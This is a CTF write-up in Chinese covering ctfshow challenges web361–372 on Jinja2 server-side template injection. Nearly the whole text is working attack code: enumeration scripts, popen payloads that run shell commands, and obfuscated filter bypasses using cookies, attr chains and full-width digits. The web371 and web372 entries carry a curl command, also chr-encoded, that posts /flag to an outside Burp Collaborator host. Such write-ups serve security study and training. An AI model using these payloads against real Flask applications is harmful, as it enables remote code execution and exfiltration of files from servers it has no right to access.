---
title: "ctfshow_ssti"
date: 2024-11-01
---
# ctfshow_ssti

## web361

查找_wrap_close

```python
import requests
url = "http://7632adcf-d2d8-4bf5-a76e-333581c7c0bf.challenge.ctf.show/"
for i in range(500):
    data = {"name":'{{"".__class__.__base__.__subclasses__().__getitem__('+str(i)+')}}'}
    try:
        response = requests.get(url,params=data)
        # print(response.text)
        if response.status_code == 200:
            if '_wrap_close' in response.text:
                print(i,"--->",response.text)
                break
    except:
        pass
```

在132

payload

```jinja2
{{''.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__('popen')("cat /flag").read()}}
```

其他题解：

```bash
web361-ssti

根据题目提示，"名字是考点"，故传参为"name" 经测试，存在ssti注入

接下来使用tplmap 扫描指定url

python2 tplmap.py -u https://9586be63-803b-4f36-b233-18bba8468973.challenge.ctf.show/?name=1
可以看到是Jinja2模板，同时最下面还提示我们可以使用--os-shell拿shell

--engine指定模板，使用 --os-shell拿到shell

python2 tplmap.py -u https://9586be63-803b-4f36-b233-18bba8468973.challenge.ctf.show/?name=1 --engine=Jinja2 --os-shell
ls/ cat /flag
```

## web362

题目禁用数字2、3

方法在***ssti.md***的数字过滤

其他题解：

```
web362-过滤部分数字
过滤了2、3等数字，os._wrap_close这个类没法使用，思考利用subprocess.Popen()

payload

?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}


{{"".__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__['popen']('cat+/flag').read()}}


?name={{''.class.base.subclasses()[140-8].init.globals['popen']'cat /flag').read()}}


payload：?name={{"".class.base.subclasses()[94]"get_data"}} 使用_frozen_importlib_external.FileLoader进行读取flag内容


经过测试过滤了数字使用{% set num='aaaaaaaaaa'|length*'aaaaaaaaaaaaaa'|length-'aaaaaaaa'|length %} 让num=132，从而实现绕过 payload： name={% set num='aaaaaaaaaa'|length*'aaaaaaaaaaaaaa'|length-'aaaaaaaa'|length %}{{().class.base.subclasses()[num].init.globals['popen']('cat /flag').read()}}


web362 {{%27%27.class.base.subclasses()[104].init.globals[%27__builtins__%27]%27eval%27}}


使用 lipsum 方法。这个是 flask 的内置方法，自带 os 模块

?name={{lipsum.__globals__.get('os').popen('cat /flag').read()}}
灵感来源：normalSSTI
```

## web363

过滤单双引号

方法在***ssti.md***的过滤单双引号

其他题解：

```
我们利用文件读取，发现最后结果给一个苦脸，肯定是过滤了什么，于是我一个尝试，发现只要有引号，就会被拦截，于是我们利用request绕过，利用_wrap_close模块，这个模块中可以使用request

找到对应位置，使用模块，发现在132位置有这个模块，于是我们可以利用 ().class.base.subclasses()[132]
payload：
http://8e6ee76e-46da-4345-8882-395c449b47c1.challenge.ctf.show/?
name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=cat /flag
我们构造了a和b两个参数，之后利用popen，popen的功能与system类似，执行系统指令


过滤单双引号，考虑使用get传参绕过

payload

?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag


/?name={{().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.param).read()}}&popen=popen&param=cat+/flag
```

## web364

过滤args

使用cookie绕过

```
?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()}}

cookie:
k1=popen; k2=ls
```

其他题解

```
过滤了args换request.values.a

payload

?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag


?name={{().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.p](request.cookies.param).read()}}
cookies
Cookie: p=popen; param=cat /flag
```

## web365

过滤方括号

.__getitem__()绕过

```
{{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag
```

其他题解

```
getitem（）是python的一个魔法方法 对字典使用时，传入字符串返回字典相应键所对应的值 当对列表使用时，传入整数返回列表对应索引的值。 可以使用getitem进行绕过 payload： name={{().class.base.subclasses().getitem(132).init.globals.getitem(request.cookies.x1)(request.cookies.x2).read()}} Cookie: x1=popen; x2=cat /flag


过滤了方括号，可以用__getitem__绕过

payload

?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag

?name={{().class.base.subclasses().getitem(132).init.globals.getitem(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
```

## web366

过滤下划线

方法在***ssti.md***的过滤下划线

## web367

```
web367-过滤os
过滤了os，可以通过get来获取

payload

?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
```

## web368

过滤了request

过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request

**payload**

```
?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```

## 369web

-{%%}中过滤了request

### 方法一 构造字符串

构造脚本

```
import requests
url="http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name={{% print (config|string|list).pop({}).lower() %}}"

payload="cat /flag"
result=""
for j in payload:
    for i in range(0,1000):
        r=requests.get(url=url.format(i))
        location=r.text.find("<h3>")
        word=r.text[location+4:location+5]
        if word==j.lower():
            print("(config|string|list).pop(%d).lower()  ==  %s"%(i,j))
            result+="(config|string|list).pop(%d).lower()~"%(i)
            break
print(result[:len(result)-1])
```

### 方法二 set构造字符

```
http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=
{% set a=(()|select|string|list).pop(24) %}    // a = _
{% set globals=(a,a,dict(globals=1)|join,a,a)|join %}  // globals=__globals__
{% set init=(a,a,dict(init=1)|join,a,a)|join %}
{% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
{% set a=(lipsum|attr(globals)).get(builtins) %}
{% set chr=a.chr %}
{% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
```

## web370

过滤数字

```
web370-过滤数字
方法一 使用count或者length获取数字
{% set one=(dict(a=a)|join|length)%}
=>  one = 1
{% set two=(dict(aa=a))|join|length)%}
=>  one = 2
方法二 使用全角数字代替半角数字
替换脚本

def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
while 1:
    t = ''
    s = input("输入想要转换的数字字符串：")
    for i in s:
        t += half2full(i)
    print(t)

payload

?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
```

```
1- ?name=
{% set a=(()|select|string|list).pop(２４) %}
{% set globals=(a,a,dict(globals=１)|join,a,a)|join %} {% set init=(a,a,dict(init=１)|join,a,a)|join %} {% set builtins=(a,a,dict(builtins=１)|join,a,a)|join %} {% set a=(lipsum|attr(globals)).get(builtins) %} {% set chr=a.chr %} {% print a.open(chr(４７)~chr(１０２)~chr(１０８)~chr(９７)~chr(１０３)).read() %}

2

{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%} {%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%} {%set x=(()|select|string|list).pop(num)%} {%set glob = (x,x,dict(globals=a)|join,x,x)|join %} {%set builtins=xx(dict(builtins=a)|join)xx%} {%set c = dict(chr=a)|join%} {%set o = dict(o=a,s=a)|join%} {%set getitem = xx(dict(getitem=a)|join)xx%} {%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%} {%set file = chr(numm)~dict(flag=a)|join%} {%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%}
```

## web371

过滤print

```
使用curl进行外带,我这里的代理服务器用的是bp的collaborator client

curl -X POST -F xx=@/flag http://l5rvcu3v2r2mab2ufjfovmdtqkwck1.burpcollaborator.net
chr字符脚本

def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
string = input("你要输入的字符串：")
result = ''
def str2chr(s):
    global  result
    for i in s:
        result += "chr("+half2full(str(ord(i)))+")%2b"
str2chr(string)
print(result[:-3])
payload

/?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１０８)%2bchr(５３)%2bchr(１１４)%2bchr(１１８)%2bchr(９９)%2bchr(１１７)%2bchr(５１)%2bchr(１１８)%2bchr(５０)%2bchr(１１４)%2bchr(５０)%2bchr(１０９)%2bchr(９７)%2bchr(９８)%2bchr(５０)%2bchr(１１７)%2bchr(１０２)%2bchr(１０６)%2bchr(１０２)%2bchr(１１１)%2bchr(１１８)%2bchr(１０９)%2bchr(１００)%2bchr(１１６)%2bchr(１１３)%2bchr(１０７)%2bchr(１１９)%2bchr(９９)%2bchr(１０７)%2bchr(４９)%2bchr(４６)%2bchr(９８)%2bchr(１１７)%2bchr(１１４)%2bchr(１１２)%2bchr(９９)%2bchr(１１１)%2bchr(１０８)%2bchr(１０８)%2bchr(９７)%2bchr(９８)%2bchr(１１１)%2bchr(１１４)%2bchr(９７)%2bchr(１１６)%2bchr(１１１)%2bchr(１１４)%2bchr(４６)%2bchr(１１０)%2bchr(１０１)%2bchr(１１６)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```

```
半角数字转全角
def num2cn(num): res='' for i in num: res+=chr(ord(i)+65248) return res

字符串转ascill码
def str2ascill(s): return [num2cn(str(ord(c))) for c in s]

arr=(str2ascill("curl http://ip:port?p=`cat /flag`"))

res='' for i in arr: res+='chr({i})~'.format(i=i)

print(res[:len(res)-1])
```

## web372

过滤count

前一个方法依然适用

```
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１０８)%2bchr(５３)%2bchr(１１４)%2bchr(１１８)%2bchr(９９)%2bchr(１１７)%2bchr(５１)%2bchr(１１８)%2bchr(５０)%2bchr(１１４)%2bchr(５０)%2bchr(１０９)%2bchr(９７)%2bchr(９８)%2bchr(５０)%2bchr(１１７)%2bchr(１０２)%2bchr(１０６)%2bchr(１０２)%2bchr(１１１)%2bchr(１１８)%2bchr(１０９)%2bchr(１００)%2bchr(１１６)%2bchr(１１３)%2bchr(１０７)%2bchr(１１９)%2bchr(９９)%2bchr(１０７)%2bchr(４９)%2bchr(４６)%2bchr(９８)%2bchr(１１７)%2bchr(１１４)%2bchr(１１２)%2bchr(９９)%2bchr(１１１)%2bchr(１０８)%2bchr(１０８)%2bchr(９７)%2bchr(９８)%2bchr(１１１)%2bchr(１１４)%2bchr(９７)%2bchr(１１６)%2bchr(１１１)%2bchr(１１４)%2bchr(４６)%2bchr(１１０)%2bchr(１０１)%2bchr(１１６)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```
